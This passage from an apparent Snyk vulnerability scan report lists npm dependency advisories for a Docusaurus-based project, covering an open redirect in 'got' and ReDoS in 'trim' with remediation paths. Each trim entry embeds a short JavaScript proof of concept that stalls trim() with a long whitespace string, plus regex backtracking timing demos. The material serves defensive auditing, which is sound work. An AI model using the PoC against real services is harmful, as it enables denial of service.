      "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
      "epssDetails": {
        "percentile": "0.22655",
        "probability": "0.00058",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-33987"
        ],
        "CWE": [
          "CWE-601"
        ]
      },
      "packageName": "got",
      "proprietary": false,
      "creationTime": "2022-06-19T09:23:24.210132Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-06-19T08:33:16Z",
      "packageManager": "npm",
      "publicationTime": "2022-06-19T15:33:44.269688Z",
      "modificationTime": "2022-11-19T20:57:05.871669Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/core@2.2.0",
        "update-notifier@5.1.0",
        "latest-version@5.1.0",
        "package-json@6.5.0",
        "got@9.6.0"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "update-notifier@6.0.0",
        "latest-version@6.0.0",
        "package-json@7.0.0",
        "got@11.8.5"
      ],
      "version": "9.6.0",
      "name": "got",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/core@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e 